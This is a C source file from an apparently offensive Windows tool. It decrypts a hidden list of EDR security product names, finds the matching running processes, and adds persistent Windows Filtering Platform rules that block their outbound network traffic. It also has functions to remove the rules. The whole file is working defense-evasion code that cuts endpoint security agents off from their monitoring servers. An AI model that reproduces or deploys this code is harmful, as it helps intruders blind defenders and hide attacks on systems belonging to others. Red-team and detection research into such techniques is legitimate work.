#include <initguid.h> // Must be included once per project to define GUIDs
#include "core.h"
#include "errors.h"
#include <strsafe.h>


// Forward declarations for internal helper functions
static void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath);
static BOOL initializeWfp(HANDLE* hEngine);
static void shutdownWfp(HANDLE hEngine);

UINT64 CustomStrToULL(const char* str, char** endptr) {
    UINT64 result = 0;
    const char* p = str;

    while (*p == ' ' || *p == '\t') {
        p++;
    }

    while (*p >= '0' && *p <= '9') {
        result = result * 10 + (*p - '0');
        p++;
    }

    if (endptr) {
        *endptr = (char*)p;
    }
    return result;
}

static void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    DWORD result = 0;

    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) {
        EWPRINTF(L"    [-] Failed to get AppID for %s\n", fullPath);
        return;
    }

    FWPM_FILTER0 blockFilter = { 0 };
    blockFilter.subLayerKey = *subLayerGuid;
    blockFilter.action.type = FWP_ACTION_BLOCK;
    blockFilter.weight.type = FWP_UINT8;
    blockFilter.weight.uint8 = 15;
    blockFilter.numFilterConditions = 1;
    blockFilter.displayData.name = EDR_FILTER_NAME;
    blockFilter.displayData.description = EDR_FILTER_DESCRIPTION;
    blockFilter.providerKey = (GUID*)&ProviderGUID;
    blockFilter.flags = FWPM_FILTER_FLAG_PERSISTENT;

    FWPM_FILTER_CONDITION0 blockCondition = { 0 };
    blockCondition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    blockCondition.matchType = FWP_MATCH_EQUAL;
    blockCondition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    blockCondition.conditionValue.byteBlob = appId;
    blockFilter.filterCondition = &blockCondition;

    // Add for IPv4 layer
    if (!FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V4, appId)) {
        UINT64 filterId = 0;
        blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
        result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
        if (result != ERROR_SUCCESS) {
            wchar_t contextBuffer[256];
            StringCchPrintfW(contextBuffer, 256, L"Failed to add IPv4 block filter for %s", fullPath);
            PrintDetailedErrorW(contextBuffer, result);
        } else {
            WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId);
        }
    } else {
        WPRINTF(L"    [!] IPv4 block filter for %s already exists. Skipping.\n", fullPath);
    }

    // Add for IPv6 layer
    if (!FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V6, appId)) {
        UINT64 filterId = 0;
        blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
        result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
        if (result != ERROR_SUCCESS) {
            wchar_t contextBuffer[256];
            StringCchPrintfW(contextBuffer, 256, L"Failed to add IPv6 block filter for %s", fullPath);
            PrintDetailedErrorW(contextBuffer, result);
        } else {
            WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId);
        }
    } else {
        WPRINTF(L"    [!] IPv6 block filter for %s already exists. Skipping.\n", fullPath);
    }

    FreeAppId(appId);
}

static BOOL initializeWfp(HANDLE* hEngine) {
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return FALSE;
    }

    // Aggressively delete existing objects to ensure a clean state.
    // This prevents issues with stale configurations from previous runs.
    // We ignore the return values because the objects may not exist, which is fine.
    FwpmSubLayerDeleteByKey0(*hEngine, &SubLayerGUID);
    FwpmProviderDeleteByKey0(*hEngine, &ProviderGUID);

    // Begin a transaction for atomic operations.
    result = FwpmTransactionBegin0(*hEngine, 0);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmTransactionBegin0 failed", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    // Add the Provider
    FWPM_PROVIDER0 provider = { 0 };
    provider.providerKey = ProviderGUID;
    provider.displayData.name = EDR_PROVIDER_NAME;
    provider.displayData.description = EDR_PROVIDER_DESCRIPTION;
    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
    result = FwpmProviderAdd0(*hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS) { 
        PrintDetailedError("FwpmProviderAdd0 failed", result);
        FwpmTransactionAbort0(*hEngine);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    // Add the Sublayer with the persistent flag
    FWPM_SUBLAYER0 subLayer = { 0 };
    subLayer.subLayerKey = SubLayerGUID;
    subLayer.displayData.name = EDR_SUBLAYER_NAME;
    subLayer.displayData.description = EDR_SUBLAYER_DESCRIPTION;
    subLayer.providerKey = (GUID*)&ProviderGUID;
    subLayer.weight = 0x01;
    subLayer.flags = FWPM_SUBLAYER_FLAG_PERSISTENT; 
    result = FwpmSubLayerAdd0(*hEngine, &subLayer, NULL);
    if (result != ERROR_SUCCESS) { 
        PrintDetailedError("FwpmSubLayerAdd0 failed", result);
        FwpmTransactionAbort0(*hEngine);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    // Commit the transaction to apply the changes.
    result = FwpmTransactionCommit0(*hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmTransactionCommit0 failed", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    return TRUE;
}

static void shutdownWfp(HANDLE hEngine) {
    if (hEngine) {
        FwpmEngineClose0(hEngine);
        PRINTF("[+] WFP engine handle closed.\n");
    }
}

void addProcessRule(const char* processPath) {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to add a process rule.\n");
        return;
    }
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    wchar_t processPathW[MAX_PATH];
    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, processPathW, MAX_PATH) == 0) {
        PrintDetailedError("Failed to convert process path to wide string", GetLastError());
        shutdownWfp(hEngine);
        return;
    }

    applyStealthFilters(hEngine, &SubLayerGUID, processPathW);

    shutdownWfp(hEngine);
}

void configureNetworkFilters() {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to access process information.\n");
        return;
    }
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    WCHAR processedPaths[100][MAX_PATH] = {0};
    int processedCount = 0;

    char** decryptedNames = (char**)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, PROCESS_DATA_COUNT * sizeof(char*));
    if (!decryptedNames) {
        PrintDetailedError("Memory allocation failed for decrypted names list", GetLastError());
        shutdownWfp(hEngine);
        return;
    }

    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
        decryptedNames[i] = decryptString(processData[i]);
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        PrintDetailedError("Failed to create snapshot of processes", GetLastError());
        for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
            if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]);
        }
        HeapFree(g_hHeap, 0, decryptedNames);
        shutdownWfp(hEngine);
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
                if (decryptedNames[i] && lstrcmpiA(pe32.szExeFile, decryptedNames[i]) == 0) {
                    PRINTF("[+] Found EDR process: %s\n", pe32.szExeFile);
                    WCHAR fullPath[MAX_PATH];
                    if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                        WPRINTF(L"[DEBUG] Full Path for %hs: %s\n", pe32.szExeFile, fullPath);
                        BOOL alreadyProcessed = FALSE;
                        for (int j = 0; j < processedCount; ++j) {
                            if (lstrcmpiW(processedPaths[j], fullPath) == 0) {
                                alreadyProcessed = TRUE;
                                break;
                            }
                        }

                        if (!alreadyProcessed) {
                            applyStealthFilters(hEngine, &SubLayerGUID, fullPath);
                            if (processedCount < 100) {
                                lstrcpyW(processedPaths[processedCount], fullPath);
                                processedCount++;
                            } else {
                                EWPRINTF(L"    [!] Warning: Processed path limit reached. May not block all subsequent finds.\n");
                            }
                        } else {
                            WPRINTF(L"    [!] Skipping already blocked process path: %s\n", fullPath);
                        }
                    } else {
                        PrintDetailedError("Could not get full path for process", GetLastError());
                    }
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
        if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]);
    }
    HeapFree(g_hHeap, 0, decryptedNames);

    CloseHandle(hSnapshot);
    shutdownWfp(hEngine);
}

static void ForceRemoveAllFilters(HANDLE hEngine) {
    FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = { 0 };
    HANDLE enumHandle = NULL;
    FWPM_FILTER0** ppFilters = NULL;
    UINT32 numEntries = 0;
    DWORD result = ERROR_SUCCESS;

    WPRINTF(L"[+] Force mode: Enumerating all filters for provider %s...\n", EDR_PROVIDER_NAME);

    enumTemplate.providerKey = (GUID*)&ProviderGUID;
    // By not setting actionMask, we search for all action types.

    result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmFilterCreateEnumHandle0 failed", result);
        return;
    }

    result = FwpmFilterEnum0(hEngine, enumHandle, (UINT32)-1, &ppFilters, &numEntries);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmFilterEnum0 failed", result);
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
        return;
    }

    if (numEntries > 0) {
        PRINTF("[+] Found %u filters to remove.\n", numEntries);
        for (UINT32 i = 0; i < numEntries; i++) {
            result = FwpmFilterDeleteById0(hEngine, ppFilters[i]->filterId);
            if (result == ERROR_SUCCESS) {
                PRINTF("    [+] Successfully removed filter ID %llu\n", ppFilters[i]->filterId);
            } else {
                char contextBuffer[128];
                StringCchPrintfA(contextBuffer, 128, "Failed to remove filter ID %llu", ppFilters[i]->filterId);
                PrintDetailedError(contextBuffer, result);
            }
        }
        FwpmFreeMemory0((void**)&ppFilters);
    } else {
        PRINTF("[+] No filters found for this provider.\n");
    }

    FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
}

void removeAllRules() {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
        return;
    }
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    if (g_isForce) {
        ForceRemoveAllFilters(hEngine);
    }

    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_SUBLAYER_NOT_FOUND) {
        PrintDetailedError("FwpmSubLayerDeleteByKey0 failed", result);
    } else {
        PRINTF("[+] WFP sublayer removed successfully.\n");
    }

    result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_PROVIDER_NOT_FOUND) {
        PrintDetailedError("FwpmProviderDeleteByKey0 failed", result);
    } else {
        PRINTF("[+] WFP provider removed successfully.\n");
    }

    FwpmEngineClose0(hEngine);
}

static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    DWORD result = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
    if (result != CUSTOM_SUCCESS) {
        PrintDetailedError("Failed to get AppID for process", result);
        return;
    }

    const GUID* layers[] = { &FWPM_LAYER_ALE_AUTH_CONNECT_V4, &FWPM_LAYER_ALE_AUTH_CONNECT_V6 };
    UINT totalRemoved = 0;

    FWPM_FILTER_CONDITION0 condition = { 0 };
    condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    condition.matchType = FWP_MATCH_EQUAL;
    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    condition.conditionValue.byteBlob = appId;

    for (int i = 0; i < 2; ++i) {
        HANDLE enumHandle = NULL;
        FWPM_FILTER0** ppFilters = NULL;
        UINT32 numEntries = 0;

        FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = { 0 };
        enumTemplate.layerKey = *layers[i];
        enumTemplate.numFilterConditions = 1;
        enumTemplate.filterCondition = &condition;
        // By not setting providerKey (it defaults to NULL), we search all providers
        // This is critical for finding orphaned filters.

        result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
        if (result != ERROR_SUCCESS) {
            continue; // Try next layer
        }

        result = FwpmFilterEnum0(hEngine, enumHandle, (UINT32)-1, &ppFilters, &numEntries);
        if (result == ERROR_SUCCESS && numEntries > 0) {
            for (UINT32 j = 0; j < numEntries; j++) {
                if (FwpmFilterDeleteById0(hEngine, ppFilters[j]->filterId) == ERROR_SUCCESS) {
                    totalRemoved++;
                }
            }
            FwpmFreeMemory0((void**)&ppFilters);
        }
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    }

    if (totalRemoved > 0) {
        WPRINTF(L"[+] Found and removed %u rule(s) for %s\n", totalRemoved, fullPath);
    } else {
        WPRINTF(L"[+] No matching rules found for %s\n", fullPath);
    }

    FreeAppId(appId);
}

void removeRulesByPath(const char* processPath) {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
        return;
    }

    wchar_t wProcessPath[MAX_PATH];
    CharArrayToWCharArray(processPath, wProcessPath, MAX_PATH);
    if (wProcessPath[0] == L'\0') {
        EPRINTF("[-] Failed to convert process path to wide string.\n");
        return;
    }

    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    PRINTF("[+] Attempting to remove all filters for process: %s\n", processPath);
    RemoveFiltersForProcess(hEngine, wProcessPath);

    FwpmEngineClose0(hEngine);
}

void removeRuleById(UINT64 ruleId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    result = FwpmFilterDeleteById0(hEngine, ruleId);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Successfully removed rule with ID %llu.\n", ruleId);
    } else {
        char contextBuffer[128];
        StringCchPrintfA(contextBuffer, 128, "Failed to remove rule with ID %llu", ruleId);
        PrintDetailedError(contextBuffer, result);
    }

    FwpmEngineClose0(hEngine);
}
